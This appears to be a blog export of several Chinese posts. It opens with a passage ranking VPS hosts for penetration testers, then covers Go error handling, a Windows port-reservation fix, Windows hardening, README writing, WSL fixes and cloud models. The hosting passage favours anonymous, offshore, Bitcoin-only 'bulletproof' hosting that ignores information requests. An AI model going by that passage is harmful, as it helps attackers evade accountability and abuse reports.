<p>提供商指出，提供离岸解决方案通常要付出一定的代价。不应该假设他们最便宜的 VPS 解决方案也是其离岸选项的价格。</p>
<h2 id="1、BulletShield"><a href="#1、BulletShield" class="headerlink" title="1、BulletShield"></a>1、BulletShield</h2><p><a href="https://bulletshield.su/">BulletShield</a> 是我的首选，是 Null Byte 读者的最佳 VPS 提供商。BulletShield 在注册账户或准备提交比特币交易时不要求任何类型的个人信息。他们还强制要求比特币交易，并且没有明确禁止任何渗透测试活动的 ToS。<br><img src="https://img.wonderhowto.com/img/36/93/63655505111133/0/white-hats-guide-choosing-virtual-private-server.w1456.jpg" alt="BulletShield"><br>缺点是他们不接受预付信用卡，最便宜的价格有点贵，但如果你重视隐私，价格不一定是主要考虑因素。</p>
<p>在涉及公司总部时，BulletShield 不会透露这些信息。快速域名搜索显示，它是由加拿大公司 Tucows Domains Inc. 购买的，是从位于西印度群岛偏远岛屿的 Charlestown 购买的。但是，这并不意味着这就是 BulletShield 的总部所在地，这只是域名注册商 BulletShield 使用注册域名的地方。</p>
<p>他们提供离岸解决方案和 Tor 友好型网站，使 BulletShield 整体处于领先地位。但是，一位客户服务代表向我提到“渗透测试”是“仅允许......防弹服务”，这可能是成本方面的问题。</p>
<ul>
<li>ToS：无可用</li>
<li>AUP：无可用</li>
<li>隐私：无可用</li>
</ul>
<h2 id="2、BuyVM"><a href="#2、BuyVM" class="headerlink" title="2、BuyVM"></a>2、BuyVM</h2><p><a href="https://buyvm.net/">BuyVM</a> 是允许合法渗透测试的亚军，如果公司或相关人员给出明确和合法的书面同意。一位代表证实了这一点，他们说“他们需要一份来自法律团队的完整文件，代表有关目标的授权书”。<br><img src="https://img.wonderhowto.com/img/33/95/63655505142883/0/white-hats-guide-choosing-virtual-private-server.w1456.jpg" alt="BuyVM"><br>他们的起价确实提升了他们的排名，VPS 解决方案每月只需 2.42 美元。但是，他们确实要求你提供个人信息，并且为了注册帐户，“帐户详细信息必须与付款方式提供的信息相符”，这可能意味着匿名预付卡将无法使用。不过，比特币是可以被接受的。</p>
<p>虽然他们确实有一个 Tor 友好的网站，但他们总部设在加拿大，并不提供离岸解决方案，这可能是负面的，取决于你使用 VPS 的目的。</p>
<ul>
<li>ToS：<a href="https://buyvm.net/terms-of-service/">链接</a></li>
<li>AUP：<a href="https://buyvm.net/acceptable-use-policy/">链接</a></li>
<li>隐私：<a href="https://buyvm.net/privacy-policy/">链接</a></li>
</ul>
<h2 id="3、ClientVPS"><a href="#3、ClientVPS" class="headerlink" title="3、ClientVPS"></a>3、ClientVPS</h2><p><a href="https://www.clientvps.com/zh-cn">ClientVPS</a> 有一个 ToS，即你所执行的任何导致对人身或财产“受到伤害”，侵犯版权等的行为都要你自己承担全部责任。<br><img src="https://img.wonderhowto.com/img/69/58/63655505152117/0/white-hats-guide-choosing-virtual-private-server.w1456.jpg" alt="ClientVPS"><br>总的来说，他们的价格是最昂贵的，但亮点包括接受比特币（预付 Visa 卡尚不清楚），拥有 Tor 友好的网站，总部设在俄罗斯（信息请求经常被忽略），并提供离岸解决方案，所有这些都巩固了其目前在排名中的地位。</p>
<p>除了高昂的价格外，其他缺点包括他们缺乏有关合法渗透测试的信息（他们没有回复我的询问），他们确实要求你提供个人数据。</p>
<ul>
<li>ToS：<a href="https://www.clientvps.com/terms-of-service">链接</a></li>
<li>AUP：无公开链接</li>
<li>隐私：<a href="https://www.clientvps.com/privacy-policy">链接</a></li>
</ul>
<h2 id="4、VPSDime"><a href="#4、VPSDime" class="headerlink" title="4、VPSDime"></a>4、VPSDime</h2><p><a href="https://vpsdime.com/">VPSDime</a> 不是一个非常理想的选择，因为它们没有比特币支付选项，不允许客户匿名查看他们的网站，也没有任何离岸 VPS 解决方案。但是，他们的 ToS 只是明确禁止“端口扫描”。他们没有提及渗透测试，漏洞扫描，网络钓鱼或其他常见的渗透活动。<br><img src="https://img.wonderhowto.com/img/00/36/63655505163524/0/white-hats-guide-choosing-virtual-private-server.w1456.jpg" alt="VPSDime"><br>当询问澄清他们的合法渗透测试政策时，他们没有回复我的电子邮件。他们的 ToS 太模糊了，我无法确定是否允许这样的（合法）活动。出于这个原因，我建议读者在使用他们的服务之前联系 VPSDime 澄清。</p>
<p>虽然 VPSDime 没有明显的好处，但它们是最便宜的选择之一。</p>
<ul>
<li>ToS：<a href="https://vpsdime.com/tos.html">链接</a></li>
<li>AUP：<a href="https://vpsdime.com/aup.html">链接</a></li>
<li>隐私：<a href="https://vpsdime.com/privacy.html">链接</a></li>
</ul>
<h2 id="5、OneHost-Cloud"><a href="#5、OneHost-Cloud" class="headerlink" title="5、OneHost Cloud"></a>5、OneHost Cloud</h2><p><a href="https://onehostcloud.hosting/">OneHost Cloud</a> 是我能找到的唯一提供 Kali Linux VPS 和渗透测试解决方案的 VPS 提供商。他们的价格仅为每月 6.59 美元，这是该提供商的另一个主要好处，并且他们接受比特币付款。<br><img src="https://img.wonderhowto.com/img/55/35/63655505173336/0/white-hats-guide-choosing-virtual-private-server.w1456.jpg" alt="OneHost Cloud"><br>对于那些不打算在未经同意的情况下非法扫描网站或入侵实体的白帽子来说，OneHost Cloud<br>似乎是最佳选择。毕竟如果它们提供 Kali 解决方案但不允许合法的渗透测试，那么对于客户来说也会非常混乱。但是，当我询问合法渗透测试时，他们只是回答：</p>
<blockquote>
<p>来自此地址的所有未来电子邮件都将被阻止。</p>
</blockquote>
<p>这是在没有任何理由或解释的情况下发给我的。出于这个原因，OneHost Cloud 排在最后，我建议读者在执行任何类型的渗透测试之前，独立地向 OneHost Cloud 询问他们的 ToS 策略。</p>
<p>该提供商的其他缺点是要求提供个人信息；位于英国伦敦；没有匿名网站；并且缺乏有关离岸解决方案和预付卡的信息。</p>
<ul>
<li>ToS：<a href="https://onehostcloud.hosting/legal/">链接</a></li>
<li>AUP：无公开链接</li>
<li>隐私：<a href="https://onehostcloud.hosting/privacy-policy/">链接</a></li>
</ul>
<h2 id="意见"><a href="#意见" class="headerlink" title="意见"></a>意见</h2><p>专业和独立渗透测试人员的选择是非常有限的。大多数 VPS 提供商都有检测系统，如果检测到任何类型的扫描，网络钓鱼或垃圾邮件，它们会自动暂停客户帐户。在我们的测试计划中，可能需要数天才能解决暂停并造成重大挫折。</p>
<p>选择愿意与我们合作以更好地保护公司网站的提供商是至关重要的。如果你是一个专业的渗透测试者，或者只是一个希望以安全和匿名的方式加强技能的新手黑客，那么选择最能满足你需求并获得乐趣的提供商。</p>
<ul>
<li>不要错过：<a href="https://null-byte.wonderhowto.com/how-to/hack-anyones-wi-fi-password-using-birthday-card-part-1-creating-payload-0183043/">如何使用生日卡片破解任何人的 Wi-Fi 密码？</a></li>
</ul>
<h2 id="一些评论"><a href="#一些评论" class="headerlink" title="一些评论"></a>一些评论</h2><p>Pulkit Singhania：</p>
<blockquote>
<p>Cloudsigma 实际上也是一个不错的选择。<br>  他们提供免费的 vps，没有任何登录或任何注册的免费，但只有一个小时。<br>  我亲自尝试过，它提供 2GB 内存和 50GB 硬盘，最高可达 25兆字节/秒的互联网流量。<br>  如果你使用公司电子邮件注册，则可免费试用 7 天</p>
</blockquote>
]]></content>
      <categories>
        <category>Translation</category>
      </categories>
  </entry>
  <entry>
    <title>为什么我不会放弃 Python 投向 Go</title>
    <url>/2021/04/10/why-im-not-leaving-python-for-go-zh/</url>
    <content><![CDATA[<p>本文翻译自 <a href="https://uberpython.wordpress.com/2012/09/23/why-im-not-leaving-python-for-go/">https://uberpython.wordpress.com/2012/09/23/why-im-not-leaving-python-for-go/</a> ，原文标题为 <em>Why I’m not leaving Python for Go</em>，译文如下：</p>
<hr>
<p>首先，Go 似乎是一门很棒的语言。它有一个<a href="https://tour.golang.org/welcome/1">很棒的教程</a>，我乐此不疲地去看，发现：</p>
<ul>
<li>Go 很快。</li>
<li>在设计上支持并发。</li>
<li>类型化（对 JIT 和 IDE 来说很重要），但不像 C 或 C++ 的<a href="http://c-faq.com/decl/spiral.anderson.html">螺旋形</a>那样繁琐和丑陋。</li>
<li>鸭子类型的接口。</li>
<li><a href="http://golang.org/doc/effective_go.html#defer">延迟（defer）</a>机制真的很精巧。</li>
</ul>
<p>但是有一个问题我不能接受。这是个遗憾，因为我很想以并发的名义进行信仰的飞跃。这个问题就是<strong>用返回值来进行错误处理</strong>。这简直像 70 年代的风格。</p>
<span id="more"></span>

<h3 id="冗长而重复的错误处理"><a href="#冗长而重复的错误处理" class="headerlink" title="冗长而重复的错误处理"></a>冗长而重复的错误处理</h3><p><a href="https://blog.golang.org/error-handling-and-go">go 的设计师认为这是一种优点。</a></p>
<blockquote>
<p>在 Go 语言中，错误处理非常重要。语言的设计和规范鼓励开发人员显式地检查错误（与其他语言抛出异常然后 catch 住是不同的）。在某些情况下，这会使 Go 代码变得<strong>冗长</strong>，但是幸运的是，可以使用一些技术来减少<strong>重复性</strong>错误处理。</p>
</blockquote>
<p>这是我在 C 语言中无法忍受的事情之一。<strong>每一行都需要一个 if 语句</strong>来防止程序做疯狂的事情。这是上述链接中的一个官方的规范示例，或许是“最小的重复性错误处理”：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> err := datastore.Get(c, key, record); err != <span class="literal">nil</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> &amp;appError&#123;err, <span class="string">&quot;Record not found&quot;</span>, <span class="number">404</span>&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> err := viewTemplate.Execute(w, record); err != <span class="literal">nil</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> &amp;appError&#123;err, <span class="string">&quot;Can&#x27;t display record&quot;</span>, <span class="number">500</span>&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在 Go 中调用函数的正确方法是将其包装在 if 语句中。即使 <a href="http://golang.org/pkg/fmt/#Println">Println</a> 也会返回一个错误值，我敢肯定，这个星球上的大多数人都不会检查。这让我想到了...</p>
<h3 id="错误悄悄忽略-——-滴答作响的定时炸弹"><a href="#错误悄悄忽略-——-滴答作响的定时炸弹" class="headerlink" title="错误悄悄忽略 —— 滴答作响的定时炸弹"></a>错误悄悄忽略 —— 滴答作响的定时炸弹</h3><p>引用 Tim Peters 的话：</p>
<blockquote>
<p>错误绝不能悄悄忽略，<br>除非它明确需要如此。</p>
</blockquote>
<p>Go 不仅停留在冗长而重复的错误处理上。它还使忽略错误变得容易和诱人。在以下程序中，即使我们未能保护总统（presidential）工作人员，我们也会触发世界末日的装置（trigger the doomsday device）。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    http.Get(<span class="string">&quot;http://www.nuke.gov/seal_presidential_bunker&quot;</span>)</span><br><span class="line">    http.Get(<span class="string">&quot;http://www.nuke.gov/trigger_doomsday_device&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>多可惜。哎呀。</p>
<p>从理论上讲，我们可以要求程序员不要忽略返回的错误。通过静态分析或约定。在实践中，仅在最关键的错误编程任务中才能忍受这一痛苦。也许这就是 Go 的目的。</p>
<h3 id="panic-recover"><a href="#panic-recover" class="headerlink" title="panic/recover"></a>panic/recover</h3><p>只要标准库很少使用它们，panic 和 recover 就不够好。为什么一个数组越界比格式字符串损坏或连接中断更容易引起 panic？Go 想完全避免异常，但意识到它们不能 —— 这里和那里都加了几个异常，让我很困惑，不知道哪个错误什么时候发生。</p>
<h3 id="或许下次吧"><a href="#或许下次吧" class="headerlink" title="或许下次吧"></a>或许下次吧</h3><p>所以我说这句话的时候非常遗憾，因为 Go 有很多惊人的想法和功能，但是如果没有现代的错误处理 —— 我是不会<strong>去</strong>的。</p>
<p>我还在等待那个开源、并发、<a href="https://web.archive.org/web/20120922025809/http://shootout.alioth.debian.org/u64q/code-used-time-used-shapes.php">左下角的语言</a>出现。有什么建议，欢迎大家多多指教。</p>
]]></content>
      <categories>
        <category>Translation</category>
      </categories>
  </entry>
  <entry>
    <title>编写Wikipedia的几点注意</title>
    <url>/2018/12/16/wikipedia/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title>Windows 10 中莫名其妙的“端口被占用”问题解决</title>
    <url>/2021/06/01/win10-port-is-already-in-use-problem/</url>
    <content><![CDATA[<p>大约是自 Windows 10 1709 更新之后（或许是 1809？2004？），莫名其妙的存在类似“端口被占用”这样的问题，比如像下面这样的报错信息：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Error: listen EACCES: permission denied 0.0.0.0:3000</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>或者启动 SS 时提示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Shadowsocks Error: Port already in use</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>又或者启动 Docker 时提示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Error starting userland proxy: Bind for 0.0.0.0:50051: unexpected error Permission denied.</span><br></pre></td></tr></table></figure>

<p>电脑重启几次之后，以上报错可能会消失，一切又恢复正常。</p>
<span id="more"></span>

<p>这表面上像是端口 <code>3000</code> 被占用，实则不然，因为当你在 PowerShell 中输入 <code>netstat -ano | findstr &quot;3000&quot;</code> 查看端口占用信息时，它却无任何输出。实际上这个错误对应的 Windows 错误码是 <a href="https://docs.microsoft.com/zh-cn/windows/win32/winsock/windows-sockets-error-codes-2">10013（WSAEACCES）</a> ：权限被拒绝。</p>
<p>出现这个错误的原因是 Windows 10 的补丁 <a href="https://support.microsoft.com/zh-cn/topic/2018-%E5%B9%B4-2-%E6%9C%88-13-%E6%97%A5-kb4074588-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%86%85%E9%83%A8%E7%89%88%E6%9C%AC-16299-248-b4e2ca66-dd7a-6fd5-a8f3-dc6683d4922b">KB4074588</a> 中存在一个已知问题：</p>
<blockquote>
<p>安装此更新后，应用程序可能无法保留或绑定到以前工作的端口。</p>
</blockquote>
<p>这些端口会被 Hyper-V 拿来保留备用，处于备用的端口无法被其他程序使用，用户登录后，系统会随机保留一些端口。使用 <code>netsh interface ipv4 show excludedportrange protocol=tcp</code> 可以查看被保留的端口段，每次重启都有可能是不同的端口。</p>
<p>因此，当你的系统启用 Hyper-V 或安装 Docker（安装 Docker Desktop 会启用 Hyper-V）之后，这个问题可能就会出现。</p>
<p>这个问题的解决方法（<a href="https://en.wikipedia.org/wiki/Workaround">workaround</a>）有两种，最粗暴的方法就是如上所述多重启几次，让它的随机端口改变，但以后仍有可能会遇到同样的问题。另一种方法是排除掉需要使用的端口，具体来说：</p>
<ol>
<li>禁用 Hyper-V</li>
<li>添加需要排除的端口范围，如：<code>netsh int ipv4 add excludedportrange protocol=tcp startport=50051 numberofports=1</code></li>
<li>重新启用 Hyper-V</li>
</ol>
<hr>
<p>参考：</p>
<ol>
<li><a href="https://github.com/shadowsocks/shadowsocks-windows/issues/1835">https://github.com/shadowsocks/shadowsocks-windows/issues/1835</a></li>
<li><a href="https://github.com/docker/for-win/issues/3171">https://github.com/docker/for-win/issues/3171</a></li>
</ol>
]]></content>
      <categories>
        <category>Bug</category>
      </categories>
  </entry>
  <entry>
    <title>Windows 系统加固</title>
    <url>/2018/05/19/windows-reinforcement/</url>
    <content><![CDATA[<h2 id="基本配置"><a href="#基本配置" class="headerlink" title="基本配置"></a>基本配置</h2><p>下面这几项应为每一个使用 Windows 的用户的<strong>最最基本</strong>安全配置：</p>
<ol>
<li>开启 Windows 防火墙</li>
<li>设置用户帐户控制（UAC）为合适级别</li>
<li>保持 Windows 更新</li>
</ol>
<span id="more"></span>
<h2 id="帐户安全"><a href="#帐户安全" class="headerlink" title="帐户安全"></a>帐户安全</h2><p>此方面的加固主要是为了防止针对帐户的暴力破解，帐户是黑客入侵系统的突破口，帐户越多，危险系数越高。</p>
<p>停用 Guest 帐户：<br>在<strong>计算机管理</strong>的<strong>本地用户和组</strong>中禁用 Guest 帐户，并为 Guest 帐户设置复杂密码，并拒绝远程访问。</p>
<p>重命名或禁用 Administrator 帐户：<br>在<strong>计算机管理</strong>的<strong>本地用户和组</strong>中为 Administrator 帐户重命名，或直接禁用。</p>
<p>创建陷阱帐户：<br>在<strong>计算机管理</strong>的<strong>本地用户和组</strong>中创建一个名为 Administrator 的本地帐户，并将它的权限设置成最低，加上一个超过 10 位的强密码。可通过将其隶属于 Guest 组已达到权限最低。</p>
<p>限制用户数量：<br>在<strong>计算机管理</strong>的<strong>本地用户和组</strong>中删除所有的测试帐户、共享帐户和普通部门帐户，一般情况下，如果系统用户超过 10 个，一般总会存在一两个弱口令帐户。</p>
<p>开启帐户锁定策略：<br>在<strong>本地安全策略</strong>的<strong>帐户锁定策略</strong>中设置帐户锁定阈值为 3 次，帐户锁定时间为 30 分钟，重置帐户锁定计数器为 30 分钟之后。</p>
<h2 id="系统安全"><a href="#系统安全" class="headerlink" title="系统安全"></a>系统安全</h2><p>一个安全操作系统的基本原则是：<strong>最小的权限+最少的服务=最大的安全</strong>。</p>
<p>开启密码策略：<br>在<strong>本地安全策略</strong>的<strong>密码策略</strong>中启用密码复杂性要求，设置密码长度最小值为 7，密码最短使用期限为 1，密码最长使用期限为 42，强制密码历史为 24，禁用以可还原的加密储存密码。</p>
<p>设置双重加密帐户保护：<br>在运行对话框中输入 <code>syskey</code>，启用 SAM 数据库加密工具，为 Windows 登录设置双重加密，注意此功能在 Windows10 中已被剔除。</p>
<p>取消默认共享：<br>编辑注册表键 <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\LanmanServer\Parameters</code>，新建项 <code>AutoShareServer</code>，值为 <code>0</code>，即可关闭盘符默认共享，新建项 <code>AutoShareWks</code>，值为 <code>0</code>，即可关闭 ADMIN 默认共享。</p>
<p>开启审核策略：<br>在<strong>本地安全策略</strong>的<strong>审核策略</strong>中审核所有的成功失败操作，记录的信息可以在<strong>事件查看器</strong>的 <strong>Windows 日志</strong>中查看。</p>
<p>修改 TTL 值：<br>编辑注册表键 <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Tcpip\Parameters</code>，新建项 <code>defaultTTL</code>，随便赋值，以防黑客通过 ping 获取 TTL 以鉴别操作系统类型。</p>
<p>关闭不必要的服务：<br>Windows 默认会启动多个服务，可以在<strong>计算机管理</strong>的<strong>服务</strong>中禁用相关服务，下面列出了一些可以禁用的服务：</p>
<ul>
<li>COM+ Event System</li>
<li>Computer Browser</li>
<li>Distributed Link Tracking Client</li>
<li>Routing and Remote Access</li>
</ul>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>编写规范的 README 文档</title>
    <url>/2018/11/02/write-standard-readme/</url>
    <content><![CDATA[<p>代码不仅是写给计算机的，也是写给人的，一篇文档的好坏直接影响着使用此代码的人的心情，针对小的项目，一般使用 <strong>README</strong> 文件来做整体描述，README 这个名字也极好的反映了此文件的目的，即“<strong>读我</strong>”。有趣的是，README 这 6 个字母通常都是大写的，这是因为<strong>在 Linux 中大写的文件名往往意味着醒目和值得注意</strong>。实际上，并没有任何人规定 README 文档应该写成什么样子，但在本文中，我将介绍一些被公认的所谓优秀的 README 文档应该是什么样子的。</p>
<span id="more"></span>
<p>README 文档通常是用 <strong>Markdown</strong> 编写的，但有时你也会看到其他格式的 README 文档，比如：有关 Python 的项目喜欢用 <strong>reStructuredText</strong> 编写 README 文档，这也是一种类似于 Markdown 的标记语言。一个优秀的 README 文档中应包含：<strong>简短的项目说明</strong>、<strong>安装说明</strong>、<strong>使用说明</strong>、<strong>如何参与贡献</strong>、<strong>许可协议</strong>等。此外，随着代码量的增加，<strong>已知 BUG</strong>、<strong>常见问题</strong>等也可以加入到 README 文档中。</p>
<p>一个规范的 README 文档模板应该像下面这样的：</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="section"># Project Name</span></span><br><span class="line">填写简短的项目说明</span><br><span class="line"><span class="section"># Installation</span></span><br><span class="line">填写安装说明</span><br><span class="line"><span class="section"># Usage</span></span><br><span class="line">填写使用说明</span><br><span class="line"><span class="section"># Contributing</span></span><br><span class="line">填写如何参与此项目的贡献方法</span><br><span class="line"><span class="section"># License</span></span><br><span class="line">填写许可协议</span><br></pre></td></tr></table></figure>

<p>有趣的是，在日常使用中，经常会见到各种各样的徽章或进度条，比如：</p>
<p><img src="https://img.shields.io/travis/rust-lang/rust.svg" alt="Travis (.org)"></p>
<p><img src="https://img.shields.io/github/release/qubyte/rubidium.svg" alt="GitHub release"></p>
<p><img src="https://img.shields.io/github/stars/git/git.svg" alt="GitHub stars"></p>
<p>它们的本质就是一个个的图片而已，要想自定义这些图片可以访问 <a href="https://shields.io/#/">Shields.io</a>。</p>
<p>最后，我将给出几个 GitHub 中项目的文档，它们的 README 文档都写得不错：</p>
<ul>
<li><a href="https://github.com/rails/rails">Rails</a></li>
<li><a href="https://github.com/thoughtbot/factory_bot">factory_bot</a></li>
<li><a href="https://github.com/meolu/walle-web">Walle</a></li>
<li><a href="https://github.com/github/ledbetter">Ledbetter</a></li>
<li><a href="https://github.com/udacity/create-your-own-adventure">Create-Your-Own-Adventure</a></li>
<li><a href="https://github.com/zkat/can.viewify">can.viewify</a></li>
</ul>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title>WSL 相关问题解决</title>
    <url>/2018/08/21/wsl-problem/</url>
    <content><![CDATA[<p>随着时间的发展，WSL 变化了很多，本文所描述的主体为 WSL 1，有关 WSL 2 的相关内容请参考 <a href="/2021/05/02/update-to-wsl-2/" title="升级到 WSL 2">升级到 WSL 2</a>。</p>
<h2 id="名称问题"><a href="#名称问题" class="headerlink" title="名称问题"></a>名称问题</h2><p>最早这个项目命名为 <strong>Bash on Ubuntu on Windows</strong>，随后改名为 <strong>Windows Subsystem for Linux</strong>（适用于 Linux 的 Windows 子系统），即 <strong>WSL</strong>，值得肯定的是，随着 Windows 10 逐渐更新，慢慢统一了命名。</p>
<span id="more"></span>

<h2 id="安装及运行"><a href="#安装及运行" class="headerlink" title="安装及运行"></a>安装及运行</h2><p>在安装前，需要在 <strong>启用或关闭 Windows 功能</strong> 中勾选 <strong>适用于 Linux 的 Windows 子系统</strong>，或者直接在管理员权限的 PowerShell 中输入 <code>Enable-WindowsOptionalFeature -Online -FeatureName &quot;Microsoft-Windows-Subsystem-Linux&quot;</code> 此条命令，也能达到同样的效果。</p>
<p>完成上述操作后，可直接在 <strong>Microsoft Store</strong> 中搜索 Linux，到本文书写为止，商店中已经有 Ubuntu、SUSE、Debian、Kali 等 Linux 发行版，个人建议下载 Ubuntu。</p>
<p>到 Ubuntu 的下载页，可以看到发布者为 Canonical 公司，这也正是 Ubuntu 的维护公司，值得注意的是，Canonical 公司还发布了特定版本的 Ubuntu 系统，例如 Ubuntu 16.04 LTS、Ubuntu 18.04 LTS 等，个人建议直接下载无版本号的 Ubuntu，而不要下载特定版本的 Ubuntu，因为无版本号的 Ubuntu 会在新版本 Ubuntu 发布之后切换到最新版，所以它始终指向最新的 Ubuntu。同时请注意，应用商店里 Ubuntu 软件的更新并不会升级 Ubuntu 版本，如果你恰好安装的是旧版本，想要升级到新版本，可以在 WSL 中运行 <code>do-release-upgrade</code> 命令升级到最新版。</p>
<p>下载完成后，要启动 Ubuntu 有多种方式，可以在 <strong>PowerShell</strong> 或 <strong>cmd</strong> 中输入 <code>wsl</code> 或 <code>bash</code> 或 <code>ubuntu</code> 都可启动，也可以直接在 <strong>开始菜单</strong> 中点击 Ubuntu 图标启动。</p>
<h2 id="SSH-问题"><a href="#SSH-问题" class="headerlink" title="SSH 问题"></a>SSH 问题</h2><p>要想在 WSL 中开启 SSH 服务，需要在配置文件（<code>/etc/ssh/sshd_config</code>）中作如下修改：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Port 2222  #将22改为2222，因Win10中自带的SSH服务也在监听22端口</span><br><span class="line">ListenAddress 0.0.0.0  #取消注释，监听所有IP</span><br><span class="line">UsePrivilegeSeparation no  #将yes修改为no</span><br><span class="line">PermitRootLogin yes  #将prohibit-password修改为yes，允许root用户登录，视个人情况而定</span><br><span class="line">PasswordAuthentication yes  #将no修改为yes，允许密码登录</span><br></pre></td></tr></table></figure>

<p>修改完成后用 <code>sudo service ssh start</code> 启动 SSH 服务，可能会报如下错误：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Could not load host key: /etc/ssh/ssh_host_rsa_key</span><br><span class="line">Could not load host key: /etc/ssh/ssh_host_dsa_key</span><br><span class="line">Could not load host key: /etc/ssh/ssh_host_ecdsa_key</span><br><span class="line">Could not load host key: /etc/ssh/ssh_host_ed25519_key</span><br></pre></td></tr></table></figure>

<p>并且此时无法使用 SSH 客户端连接到服务器端，客户端会报如下错误：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Connection closed by 127.0.0.1 port 2222</span><br></pre></td></tr></table></figure>

<p>造成这种情况的原因是服务端在启动 SSH 服务时发现加密过程中需要用到的密钥文件未找到，可依次用如下命令生成所需文件：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -f /etc/ssh/ssh_host_rsa_key</span><br><span class="line">ssh-keygen -t dsa -f /etc/ssh/ssh_host_dsa_key</span><br><span class="line">ssh-keygen -t ecdsa -f /etc/ssh/ssh_host_ecdsa_key</span><br><span class="line">ssh-keygen -t ed25519 -f /etc/ssh/ssh_host_ed25519_key</span><br></pre></td></tr></table></figure>

<p>其中 <code>-t</code> 参数表示加密类型，<code>-f</code> 参数表示生成的密钥文件名，错误信息中缺少什么密钥按需生成即可。之后再重新启动 SSH 服务即可正常工作。</p>
<h2 id="图形界面问题"><a href="#图形界面问题" class="headerlink" title="图形界面问题"></a>图形界面问题</h2><p>在你当前所使用的 shell 的配置文件里（比如 <code>.bashrc</code> 或 <code>.zshrc</code>），添加如下命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> DISPLAY=localhost:0</span><br></pre></td></tr></table></figure>

<p>随后打开 X Server 客户端（比如 <a href="https://sourceforge.net/projects/xming/">Xming</a> 或 <a href="https://sourceforge.net/projects/vcxsrv/">VcXsrv</a>）并将 Display 项设为 0 即可运行图形化应用。笔者所使用的是 <a href="https://mobaxterm.mobatek.net/">MobaXterm</a>，其设置路径为 <strong>Settings</strong> —&gt; <strong>Configuration</strong> —&gt; <strong>X11</strong> —&gt; <strong>Display offset</strong>。</p>
<h2 id="EXE-程序问题"><a href="#EXE-程序问题" class="headerlink" title="EXE 程序问题"></a>EXE 程序问题</h2><h2 id="netstat-和-ps"><a href="#netstat-和-ps" class="headerlink" title="netstat 和 ps"></a>netstat 和 ps</h2><h2 id="systemd"><a href="#systemd" class="headerlink" title="systemd"></a>systemd</h2><p>WSL 中至今还没有使用 systemd，因此执行类似 <code>sudo systemctl start nginx</code> 这样的命令，会报如下这样的错误：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">System has not been booted with systemd as init system (PID 1). Can&#x27;t operate.</span><br></pre></td></tr></table></figure>

<p>一个替代方法是使用 service，如 <code>sudo service nginx start</code>。</p>
<h2 id="后台运行问题"><a href="#后台运行问题" class="headerlink" title="后台运行问题"></a>后台运行问题</h2><h2 id="无法使用的软件"><a href="#无法使用的软件" class="headerlink" title="无法使用的软件"></a>无法使用的软件</h2><p>以下软件在 WSL 中暂时无法正常使用：</p>
<ul>
<li><code>nmap</code>，详情请参见 <a href="https://github.com/microsoft/WSL/issues/1349">nmap not working</a>。</li>
<li><code>proxychains</code></li>
</ul>
<h2 id="更多"><a href="#更多" class="headerlink" title="更多"></a>更多</h2><p>有关 WSL 的更多内容，可以查看 <a href="https://docs.microsoft.com/zh-cn/windows/wsl">WSL 官方文档</a>，在使用 WSL 的过程中遇到任何问题，可以去 <a href="https://github.com/microsoft/WSL">WSL 的 GitHub 地址</a>提 Issues。</p>
]]></content>
      <categories>
        <category>Bug</category>
      </categories>
      <tags>
        <tag>Windows</tag>
        <tag>Linux</tag>
        <tag>WSL</tag>
      </tags>
  </entry>
  <entry>
    <title>云服务的三种模式</title>
    <url>/2018/07/15/xaas/</url>
    <content><![CDATA[<p>云服务的模式一般有 IaaS、PaaS、SaaS 三种，既然是云服务，也即我们不用购买真实的计算设备，所有的模式都是基于此之上的。</p>
<h2 id="IaaS"><a href="#IaaS" class="headerlink" title="IaaS"></a>IaaS</h2><p><strong>IaaS</strong>，Infrastructure as a Service（基础设施即服务），云服务的最底层，服务商提供操作系统、存储设施、硬件配置等资源，典型的例子是 <strong>VPS</strong>，即 Virtual Private Server（虚拟专用服务器），这类服务一般提供必要的 Shell 接口，可使用户连接到操作系统进行相关配置，常见的 VPS 厂商有 <a href="https://aws.amazon.com/cn/ec2/">Amazon EC2</a>、<a href="https://www.aliyun.com/product/ecs">阿里云 ECS</a> 等。</p>
<h2 id="PaaS"><a href="#PaaS" class="headerlink" title="PaaS"></a>PaaS</h2><p><strong>PaaS</strong>，Platform as a Service（平台即服务），云服务的中间层，服务商提供必要的应用，用户无权访问操作系统及硬件等资源，典型的例子是<strong>虚拟空间</strong>，这类服务一般会提供必要的 Web 服务器、数据库等，用户可以直接在其上部署 Web 应用，常见的 PaaS 厂商有 <a href="https://cloud.google.com/appengine/">Google App Engine(GAE)</a>、<a href="https://www.heroku.com/">Heroku</a> 等。</p>
